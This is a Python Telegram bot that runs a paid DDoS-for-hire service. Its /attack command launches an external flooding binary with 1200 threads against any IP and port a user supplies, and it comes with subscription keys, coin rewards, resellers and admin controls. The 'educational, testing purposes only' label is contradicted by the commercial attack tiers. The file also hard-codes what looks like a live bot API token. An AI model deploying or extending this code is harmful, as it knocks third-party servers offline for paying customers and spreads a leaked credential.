import telebot
import subprocess
import threading
import time
import json
import os
import sys
import random
from datetime import datetime, timedelta

# Bot setup
API_TOKEN = '8094930692:AAGy-bnpYA0A1j6B3lRWol-GyfK9gtiMwCo'
GROUP_USERNAME = 'DDOS_SERVER69'
OWNER_ID = '1866961136'
bot = telebot.TeleBot(API_TOKEN)

# Data storage file
DATA_FILE = 'bot_data.json'

# Save data to file
def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Load or initialize data
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
else:
    data = {
        'users': {},
        'keys': {},
        'banned': []
    }

# Auto-register owner as admin if not present
if OWNER_ID not in data['users']:
    data['users'][OWNER_ID] = {
        'type': 'admin',
        'plan': 'premium',
        'limit': 600,
        'expires': 0,
        'coins': 1000,
        'invited_by': None,
        'group_invites': 0
    }
    save_data()

# Coin prices for trial keys
COIN_PRICES = {
    '1h': 50,
    '1d': 100,
    '3d': 500,
    '7d': 700,
    '30d': 1500
}

# Global attack control and configuration
attacks = {}
BOT_CONFIG = {
    'attack_threads': 1200,
    'packet_size': 512
}

# Execute Rohan binary for attack
def run_attack(user_id, ip, port, duration, chat_id):
    try:
        packet_size = BOT_CONFIG['packet_size']
        threads = BOT_CONFIG['attack_threads']
        process = subprocess.Popen(['./Rohan', ip, str(port), str(duration), str(packet_size), str(threads)])
        attacks[user_id] = {'process': process, 'chat_id': chat_id}
        process.wait()
        bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱✅\n\n"
                                 f"𝗧𝗮𝗿𝗴𝗲𝘁: {ip}:{port}\n"
                                 f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
                                 f"᚛ ᚛ @Rohan2349 ᚜ ᚜")
    except FileNotFoundError:
        bot.send_message(chat_id, "Error: Rohan binary not found.")
    finally:
        if user_id in attacks:
            del attacks[user_id]

# /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    args = message.text.split()
    referrer_id = args[1][4:] if len(args) > 1 and args[1].startswith('ref_') else None

    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        data['users'][user_id] = {
            'type': 'user', 'plan': 'free', 'limit': 120, 'expires': 0, 'coins': 0,
            'invited_by': referrer_id, 'group_invites': 0
        }
        if referrer_id and referrer_id in data['users'] and referrer_id != user_id and message.chat.type in ['group', 'supergroup']:
            referrer = data['users'][referrer_id]
            referrer['group_invites'] += 1
            referrer['coins'] += 10
            bot.send_message(referrer_id, f"🎉 You earned 10 coins! User {user_id} joined the group via your invite.")
        save_data()
    bot.reply_to(message, "🛠 Welcome to the Educational DDoS Bot 🛠\n"
                          "For testing purposes only!\nUse /help for commands.")

# /help
@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    user_type = data['users'].get(user_id, {}).get('type', 'user')
    
    help_text = (
        "🛠 *Bot Commands Guide* 🛠\n\n"
        "👤 *User Commands:*\n"
        "/start ➠ Show bot introduction\n"
        "/myinfo ➠ Check your account status and limits\n"
        "/attack [IP] [PORT] [TIME] ➠ Launch attack\n"
        "   _Example:_ /attack 127.0.0.1 8000 60\n"
        "/stop ➠ Stop ongoing attack\n"
        "/redeem [KEY] ➠ Activate subscription key\n"
        "   _Example:_ /redeem Rohan-1234\n"
        "/plan ➠ View subscription plans\n"
        "/coins ➠ Check your coin balance\n"
        "/buykey [DURATION] ➠ Buy a trial key with coins (200s limit)\n"
        "   _Options:_ 1h, 1d, 3d, 7d, 30d\n"
        "/spend [COINS] ➠ Spend coins to increase attack limit (10 coins = 20s, max 200s)\n"
        "   _Example:_ /spend 50\n"
        "/invite ➠ Get group referral link to earn coins\n"
        "/leaderboard ➠ View top group inviters\n"
        "/help ➠ Show this guide\n\n"
    )
    if user_type == 'reseller':
        help_text += (
            "🔧 *Reseller Commands:*\n"
            "/buykey [DURATION] [LIMIT] ➠ Generate a trial key with custom attack limit (100-600s)\n"
            "   _Example:_ /buykey 1d 300 (costs base + extra coins based on limit)\n"
        )
    if user_type == 'admin':
        help_text += (
            "🔐 *Admin Commands:*\n"
            "/gen [KEY] [DURATION] [USES] ➠ Generate access key\n"
            "   _Example:_ /gen Rohan-9999 1d 5\n"
            "/allkey ➠ List all generated keys\n"
            "/block [KEY] ➠ Block existing key\n"
            "   _Example:_ /block Rohan-1234\n"
            "/add [TYPE] [USER_ID] [DURATION] [COINS (optional)] ➠ Add user/admin/reseller with initial coins\n"
            "   _Example:_ /add reseller 123456789 permanent 1000\n"
            "/remove [USER_ID] ➠ Remove user/admin/reseller\n"
            "/ban [USER_ID] ➠ Ban user\n"
            "/unban [USER_ID] ➠ Unban user\n"
            "/users ➠ List all users and admins\n"
            "/limit [USER_ID] [SECONDS] ➠ Set attack duration limit\n"
            "   _Example:_ /limit 123456789 600\n"
            "/broadcast [MESSAGE] ➠ Send a message to all users\n"
            "   _Example:_ /broadcast Server maintenance at 3 PM\n"
            "/botupdate ➠ Check bot status and clean up expired data\n"
            "/terminal [SUBCOMMAND] [ARGS] ➠ Owner-only terminal commands (ls, set thread, set packet size, etc.)\n"
            "   _Example:_ /terminal set thread 1500\n"
            "/shutdown ➠ Stop the bot (Owner only)\n"
        )
    bot.reply_to(message, help_text, parse_mode='Markdown')

# /invite
@bot.message_handler(commands=['invite'])
def send_invite(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        bot.reply_to(message, "Use /start to register first.")
        return
    group_link = f"t.me/{GROUP_USERNAME}?start=ref_{user_id}"
    bot.reply_to(message, f"📩 *Your Group Invite Link:*\n"
                          f"`{group_link}` - Earn 10 coins per invite\n"
                          "Share this link to earn coins!", parse_mode='Markdown')

# /leaderboard
@bot.message_handler(commands=['leaderboard'])
def show_leaderboard(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    leaderboard = sorted(
        data['users'].items(),
        key=lambda x: (x[1]['group_invites'], x[1]['coins']),
        reverse=True
    )[:10]
    text = "🏆 *Leaderboard - Top Group Inviters* 🏆\n\n"
    for i, (uid, user) in enumerate(leaderboard, 1):
        text += f"{i}. ID: {uid} - Group Invites: {user['group_invites']} - Coins: {user['coins']}\n"
    bot.reply_to(message, text or "No inviters yet!", parse_mode='Markdown')

# /shutdown (Owner only)
@bot.message_handler(commands=['shutdown'])
def shutdown_bot(message):
    user_id = str(message.from_user.id)
    if user_id != OWNER_ID:
        bot.reply_to(message, "Only the owner can use this command.")
        return
    bot.reply_to(message, "Shutting down the bot...")
    save_data()
    bot.stop_polling()
    sys.exit(0)

# /myinfo
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 120, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    user = data['users'][user_id]
    expires = "Never" if user['expires'] == 0 else datetime.fromtimestamp(user['expires']).strftime('%Y-%m-%d %H:%M:%S')
    bot.reply_to(message, f"ID: {user_id}\nType: {user['type']}\nPlan: {user['plan']}\n"
                          f"Attack Limit: {user['limit']}s\nExpires: {expires}\nCoins: {user['coins']}\n"
                          f"Group Invites: {user['group_invites']}")

# /coins
@bot.message_handler(commands=['coins'])
def check_coins(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        data['users'][user_id] = {'type': 'user', 'plan': 'free', 'limit': 120, 'expires': 0, 'coins': 0, 'invited_by': None, 'group_invites': 0}
        save_data()
    coins = data['users'][user_id]['coins']
    bot.reply_to(message, f"Your balance: {coins} coins")

# /buykey [DURATION] [LIMIT] (for resellers)
@bot.message_handler(commands=['buykey'])
def buy_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        bot.reply_to(message, "Use /start to register first.")
        return
    args = message.text.split()
    is_reseller = data['users'][user_id]['type'] == 'reseller'
    
    if is_reseller and len(args) != 3:
        bot.reply_to(message, "Usage for resellers: /buykey [DURATION] [LIMIT]\n"
                              "Options: 1h, 1d, 3d, 7d, 30d | Limit: 100-600s\n"
                              "Example: /buykey 1d 300")
        return
    elif not is_reseller and len(args) != 2:
        bot.reply_to(message, "Usage for users: /buykey [DURATION]\nOptions: 1h, 1d, 3d, 7d, 30d")
        return
    
    duration_str = args[1]
    if duration_str not in COIN_PRICES:
        bot.reply_to(message, "Invalid duration. Options: 1h, 1d, 3d, 7d, 30d")
        return
    
    user = data['users'][user_id]
    if is_reseller:
        try:
            attack_limit = int(args[2])
            if attack_limit < 100 or attack_limit > 600:
                bot.reply_to(message, "Attack limit must be between 100 and 600 seconds.")
                return
            base_cost = COIN_PRICES[duration_str]
            extra_cost = (attack_limit - 100) // 5
            cost = base_cost + extra_cost
        except ValueError:
            bot.reply_to(message, "Invalid attack limit. Must be an integer between 100 and 600.")
            return
    else:
        cost = COIN_PRICES[duration_str]
        attack_limit = 200
    
    if user['coins'] < cost:
        bot.reply_to(message, f"Not enough coins! You need {cost}, but have {user['coins']}.")
        return
    
    # Generate a short Rohan-XXXX key
    while True:
        key_code = f"Rohan-{random.randint(1000, 9999)}"
        if key_code not in data['keys']:  # Ensure uniqueness
            break
    duration = {'1h': 3600, '1d': 86400, '3d': 259200, '7d': 604800, '30d': 2592000}[duration_str]
    data['keys'][key_code] = {
        'duration': duration,
        'uses': 1,
        'active': True,
        'created': time.time(),
        'coin_purchased': True,
        'attack_limit': attack_limit
    }
    user['coins'] -= cost
    save_data()
    
    if is_reseller:
        bot.reply_to(message, f"Key generated for sale: `{key_code}`\n"
                              f"Duration: {duration_str}\n"
                              f"Attack Limit: {attack_limit}s\n"
                              f"Cost: {cost} coins\n"
                              "Share this key with a user for them to redeem with /redeem.", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"Key generated: `{key_code}`\n"
                              f"Duration: {duration_str}\n"
                              f"Attack Limit: 200s\n"
                              f"Cost: {cost} coins\n"
                              "Use /redeem {key_code} to activate.", parse_mode='Markdown')

# /attack [IP] [PORT] [TIME]
@bot.message_handler(commands=['attack'])
def start_attack(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        bot.reply_to(message, "Use /start to register first.")
        return
    if user_id in attacks:
        bot.reply_to(message, "Attack already running. Use /stop first.")
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /attack [IP] [PORT] [TIME]\nExample: /attack 127.0.0.1 8000 60")
        return
    target_ip, target_port, time_str = args[1], args[2], args[3]
    try:
        duration = int(time_str)
        port = int(target_port)
        user = data['users'][user_id]
        if duration > user['limit']:
            bot.reply_to(message, f"Duration exceeds your limit of {user['limit']} seconds.")
            return
        if user['expires'] and time.time() > user['expires']:
            bot.reply_to(message, "Your plan has expired.")
            return
        packet_size = BOT_CONFIG['packet_size']
        thread_count = BOT_CONFIG['attack_threads']
        bot.reply_to(message, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
                              f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
                              f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
                              f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
                              f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
                              f"᚛ ᚛ @Rohan2349 ᚜ ᚜")
        attack_thread = threading.Thread(target=run_attack, args=(user_id, target_ip, target_port, duration, chat_id))
        attack_thread.start()
    except ValueError:
        bot.reply_to(message, "Invalid port or time.")

# /stop
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in attacks:
        bot.reply_to(message, "No attack running.")
        return
    attacks[user_id]['process'].terminate()
    del attacks[user_id]
    bot.reply_to(message, "Attack stopped.")

# /redeem [KEY]
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /redeem [KEY]\nExample: /redeem Rohan-1234")
        return
    key = args[1]
    if key not in data['keys'] or not data['keys'][key]['active'] or data['keys'][key]['uses'] <= 0:
        bot.reply_to(message, "Invalid or expired key.")
        return
    key_data = data['keys'][key]
    limit = key_data.get('attack_limit', 600)
    data['users'][user_id] = {
        'type': 'user',
        'plan': 'premium',
        'limit': limit,
        'expires': time.time() + key_data['duration'] if key_data['duration'] != 0 else 0,
        'coins': data['users'][user_id].get('coins', 0),
        'invited_by': data['users'][user_id].get('invited_by', None),
        'group_invites': data['users'][user_id].get('group_invites', 0)
    }
    data['keys'][key]['uses'] -= 1
    if data['keys'][key]['uses'] == 0:
        data['keys'][key]['active'] = False
    save_data()
    bot.reply_to(message, f"Key redeemed! You now have premium access with a {limit}s attack limit.")

# /plan
@bot.message_handler(commands=['plan'])
def show_plans(message):
    bot.reply_to(message, "Plans:\nFree: 120s attack limit\nPremium: Up to 600s attack limit\n"
                          "Trial Keys (via /buykey):\n1h = 50 coins\n1d = 100 coins\n"
                          "3d = 500 coins\n7d = 700 coins\n30d = 1500 coins\n"
                          "Resellers can set custom limits (100-600s) with extra coin costs.")

# /spend [COINS]
@bot.message_handler(commands=['spend'])
def spend_coins(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "You are banned.")
        return
    if user_id not in data['users']:
        bot.reply_to(message, "Use /start to register first.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /spend [COINS]\nCost: 10 coins = 20s extra attack limit (max 200s total)")
        return
    
    try:
        coins_to_spend = int(args[1])
        if coins_to_spend <= 0:
            raise ValueError("Amount must be positive.")
        
        user = data['users'][user_id]
        if coins_to_spend > user['coins']:
            bot.reply_to(message, f"Not enough coins! You have {user['coins']} coins.")
            return
        
        extra_seconds = (coins_to_spend // 10) * 20
        new_limit = min(user['limit'] + extra_seconds, 200)
        if new_limit == user['limit']:
            bot.reply_to(message, "You’ve already reached the maximum attack limit of 200s.")
            return
        
        user['coins'] -= coins_to_spend
        user['limit'] = new_limit
        save_data()
        bot.reply_to(message, f"Spent {coins_to_spend} coins! Your attack limit is now {new_limit}s.")
    
    except ValueError:
        bot.reply_to(message, "Invalid coin amount. Use a positive integer.")

# Admin/Reseller Commands
def is_admin_or_reseller(user_id):
    return str(user_id) in data['users'] and data['users'][str(user_id)]['type'] in ['admin', 'reseller']

def is_admin(user_id):
    return str(user_id) in data['users'] and data['users'][str(user_id)]['type'] == 'admin'

# /gen [KEY] [DURATION] [USES]
@bot.message_handler(commands=['gen'])
def generate_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /gen [KEY] [DURATION] [USES]\nExample: /gen Rohan-9999 1d 5")
        return
    key = args[1]
    if not key.startswith("Rohan-") or len(key) != 9 or not key[6:].isdigit():
        # Generate a new key if the provided one doesn’t match the format
        while True:
            key = f"Rohan-{random.randint(1000, 9999)}"
            if key not in data['keys']:
                break
    duration_str, uses = args[2], int(args[3])
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['keys'][key] = {'duration': duration, 'uses': uses, 'active': True, 'created': time.time()}
    save_data()
    bot.reply_to(message, f"Key `{key}` generated: {duration}s duration, {uses} uses.", parse_mode='Markdown')

# /add [TYPE] [USER_ID] [DURATION] [COINS]
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) < 4 or len(args) > 5:
        bot.reply_to(message, "Usage: /add [TYPE] [USER_ID] [DURATION] [COINS (optional)]\n"
                              "Example: /add reseller 123456789 permanent 1000")
        return
    
    type_, target_user_id, duration_str = args[1], args[2], args[3]
    initial_coins = int(args[4]) if len(args) == 5 else 500
    
    if type_ not in ['user', 'admin', 'reseller']:
        bot.reply_to(message, "Type must be user, admin, or reseller.")
        return
    if initial_coins < 0:
        bot.reply_to(message, "Coins must be a positive number.")
        return
    
    duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1)
    data['users'][target_user_id] = {
        'type': type_,
        'plan': 'premium' if type_ in ['admin', 'reseller'] else 'free',
        'limit': 600 if type_ in ['admin', 'reseller'] else 120,
        'expires': time.time() + duration if duration else 0,
        'coins': initial_coins,
        'invited_by': None,
        'group_invites': 0
    }
    save_data()
    bot.reply_to(message, f"Added {type_} {target_user_id} with {duration_str} duration and {initial_coins} coins.")

# /users
@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    if not data['users']:
        bot.reply_to(message, "No users registered yet.")
        return
    response = "📋 *Registered Users:*\n\n"
    for uid, user in data['users'].items():
        expires = "Never" if user['expires'] == 0 else datetime.fromtimestamp(user['expires']).strftime('%Y-%m-%d %H:%M:%S')
        response += (f"ID: {uid}\n"
                     f"Type: {user['type']}\n"
                     f"Plan: {user['plan']}\n"
                     f"Limit: {user['limit']}s\n"
                     f"Expires: {expires}\n"
                     f"Coins: {user['coins']}\n"
                     f"Group Invites: {user['group_invites']}\n\n")
    bot.reply_to(message, response, parse_mode='Markdown')

# /limit
@bot.message_handler(commands=['limit'])
def set_limit(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage: /limit [USER_ID] [SECONDS]\nExample: /limit 123456789 600")
        return
    target_user_id, limit = args[1], args[2]
    try:
        limit = int(limit)
        if limit < 0:
            raise ValueError("Limit must be non-negative.")
        if target_user_id not in data['users']:
            bot.reply_to(message, f"User {target_user_id} not found.")
            return
        data['users'][target_user_id]['limit'] = limit
        save_data()
        bot.reply_to(message, f"Set attack limit for user {target_user_id} to {limit} seconds.")
    except ValueError:
        bot.reply_to(message, "Invalid limit value. Must be a non-negative number.")

# /ban
@bot.message_handler(commands=['ban'])
def ban_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /ban [USER_ID]\nExample: /ban 123456789")
        return
    target_user_id = args[1]
    if target_user_id not in data['users']:
        bot.reply_to(message, f"User {target_user_id} not found.")
        return
    if target_user_id in data['banned']:
        bot.reply_to(message, f"User {target_user_id} is already banned.")
        return
    data['banned'].append(target_user_id)
    save_data()
    bot.reply_to(message, f"User {target_user_id} has been banned.")

# /unban
@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /unban [USER_ID]\nExample: /unban 123456789")
        return
    target_user_id = args[1]
    if target_user_id not in data['banned']:
        bot.reply_to(message, f"User {target_user_id} is not banned.")
        return
    data['banned'].remove(target_user_id)
    save_data()
    bot.reply_to(message, f"User {target_user_id} has been unbanned.")

# /allkey
@bot.message_handler(commands=['allkey'])
def list_keys(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    if not data['keys']:
        bot.reply_to(message, "No keys generated yet.")
        return
    response = "🔑 *Generated Keys:*\n\n"
    for key, key_data in data['keys'].items():
        duration = "Permanent" if key_data['duration'] == 0 else f"{key_data['duration']}s"
        response += (f"Key: `{key}`\n"
                     f"Duration: {duration}\n"
                     f"Uses Remaining: {key_data['uses']}\n"
                     f"Active: {key_data['active']}\n"
                     f"Attack Limit: {key_data.get('attack_limit', 'N/A')}s\n\n")
    bot.reply_to(message, response, parse_mode='Markdown')

# /block
@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /block [KEY]\nExample: /block Rohan-1234")
        return
    key = args[1]
    if key not in data['keys']:
        bot.reply_to(message, f"Key {key} not found.")
        return
    if not data['keys'][key]['active']:
        bot.reply_to(message, f"Key {key} is already blocked.")
        return
    data['keys'][key]['active'] = False
    save_data()
    bot.reply_to(message, f"Key {key} has been blocked.")

# /remove
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /remove [USER_ID]\nExample: /remove 123456789")
        return
    target_user_id = args[1]
    if target_user_id not in data['users']:
        bot.reply_to(message, f"User {target_user_id} not found.")
        return
    if target_user_id == OWNER_ID:
        bot.reply_to(message, "Cannot remove the owner.")
        return
    del data['users'][target_user_id]
    if target_user_id in data['banned']:
        data['banned'].remove(target_user_id)
    save_data()
    bot.reply_to(message, f"User {target_user_id} has been removed from the system.")

# /broadcast
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "Usage: /broadcast [MESSAGE]\nExample: /broadcast Hello everyone!")
        return
    broadcast_text = args[1]
    success_count = 0
    fail_count = 0
    
    for target_user_id in data['users'].keys():
        try:
            bot.send_message(target_user_id, f"📢 *Broadcast Message:*\n\n{broadcast_text}", parse_mode='Markdown')
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"Failed to send broadcast to {target_user_id}: {e}")
    
    bot.reply_to(message, f"Broadcast completed!\nSent to: {success_count} users\nFailed: {fail_count} users")

# /botupdate
@bot.message_handler(commands=['botupdate'])
def bot_update(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "Admin only.")
        return
    
    current_time = time.time()
    removed_users = 0
    removed_keys = 0
    
    users_to_remove = [uid for uid, user in data['users'].items() if user['expires'] != 0 and user['expires'] < current_time]
    for uid in users_to_remove:
        del data['users'][uid]
        if uid in data['banned']:
            data['banned'].remove(uid)
        removed_users += 1
    
    keys_to_remove = [key for key, key_data in data['keys'].items() if (key_data['uses'] <= 0 or 
                      (key_data['duration'] != 0 and 'created' in key_data and key_data['created'] + key_data['duration'] < current_time))]
    for key in keys_to_remove:
        del data['keys'][key]
        removed_keys += 1
    
    for key, key_data in data['keys'].items():
        if 'created' not in key_data:
            key_data['created'] = current_time
    
    save_data()
    
    total_users = len(data['users'])
    total_keys = len(data['keys'])
    active_attacks = len(attacks)
    
    response = (
        "🤖 *Bot Update Report:*\n\n"
        f"Total Users: {total_users}\n"
        f"Total Keys: {total_keys}\n"
        f"Active Attacks: {active_attacks}\n"
        f"Removed Expired Users: {removed_users}\n"
        f"Removed Expired/Used Keys: {removed_keys}\n"
        "Bot data optimized and saved."
    )
    bot.reply_to(message, response, parse_mode='Markdown')

# /terminal (Owner only)
@bot.message_handler(commands=['terminal'])
def terminal_command(message):
    user_id = str(message.from_user.id)
    if user_id != OWNER_ID:
        bot.reply_to(message, "Owner only.")
        return
    
    args = message.text.split(maxsplit=2)
    if len(args) < 2:
        bot.reply_to(message, "Usage: /terminal [SUBCOMMAND] [ARGUMENTS]\n"
                              "Subcommands: ls, cd, set thread, set packet size\n"
                              "Examples:\n"
                              "/terminal ls users\n"
                              "/terminal set thread 1500")
        return
    
    subcommand = args[1].lower()
    
    if subcommand == 'ls':
        if len(args) < 3:
            bot.reply_to(message, "Usage: /terminal ls [users|keys|attacks]")
            return
        target = args[2].lower()
        if target == 'users':
            if not data['users']:
                bot.reply_to(message, "No users.")
                return
            response = "Users:\n" + "\n".join([f"{uid}: {user['type']}" for uid, user in data['users'].items()])
        elif target == 'keys':
            if not data['keys']:
                bot.reply_to(message, "No keys.")
                return
            response = "Keys:\n" + "\n".join([f"{key}: {kdata['uses']} uses" for key, kdata in data['keys'].items()])
        elif target == 'attacks':
            if not attacks:
                bot.reply_to(message, "No active attacks.")
                return
            response = "Active Attacks:\n" + "\n".join([f"{uid}" for uid in attacks.keys()])
        else:
            bot.reply_to(message, "Invalid ls target. Use: users, keys, attacks")
            return
        bot.reply_to(message, response)
    
    elif subcommand == 'cd':
        bot.reply_to(message, "cd is not applicable in this context. Use ls to list data.")
    
    elif subcommand == 'set':
        if len(args) < 3:
            bot.reply_to(message, "Usage: /terminal set [thread|packet size] [VALUE]")
            return
        setting = args[2].split(maxsplit=1)
        if len(setting) < 2:
            bot.reply_to(message, "Specify a value for the setting.")
            return
        key, value = setting[0].lower(), setting[1]
        
        try:
            value = int(value)
            if value <= 0:
                raise ValueError("Value must be positive.")
            
            if key == 'thread':
                BOT_CONFIG['attack_threads'] = value
                bot.reply_to(message, f"Attack threads set to {value}.")
            elif key == 'packet size':
                BOT_CONFIG['packet_size'] = value
                bot.reply_to(message, f"Packet size set to {value} bytes.")
            else:
                bot.reply_to(message, "Invalid setting. Use: thread, packet size")
        except ValueError:
            bot.reply_to(message, "Value must be a positive integer.")
    
    else:
        bot.reply_to(message, "Unknown subcommand. Use: ls, cd, set thread, set packet size")

# Run the bot with retry logic
if __name__ == "__main__":
    while True:
        try:
            bot.polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)